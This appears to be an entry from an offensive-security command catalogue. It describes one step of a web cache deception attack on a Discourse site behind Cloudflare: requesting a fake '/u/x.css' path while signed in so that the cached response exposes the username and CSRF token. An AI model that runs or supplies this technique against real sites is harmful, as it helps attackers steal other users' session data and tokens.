---
data: GET /u/x.css HTTP/1.1
tags:
  - http-request
  - caching
type: command
executor: bash
platforms:
  - Web
id: 06461198-58d3-48e1-9302-3542c336640b
created_at: '2025-12-13T09:00:34.469Z'
updated_at: '2025-12-13T09:00:34.469Z'
verified: false
validated: true
submitted: true
---
# Request Page to Trigger Caching

## Command

```bash
GET /u/x.css HTTP/1.1
```

## Description

Requests the page twice while signed in to trigger caching in CloudFlare, exposing username and CSRF.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Generic request | No |

## Examples

### Basic Usage

```bash
GET /u/x.css HTTP/1.1
```

## Expected Output

CF-Cache-Status: HIT and exposure of X-Discourse-Username and csrf-token

## Related

- [[procedures/Taint-CloudFlare-Cache-with-Victim-Data]]
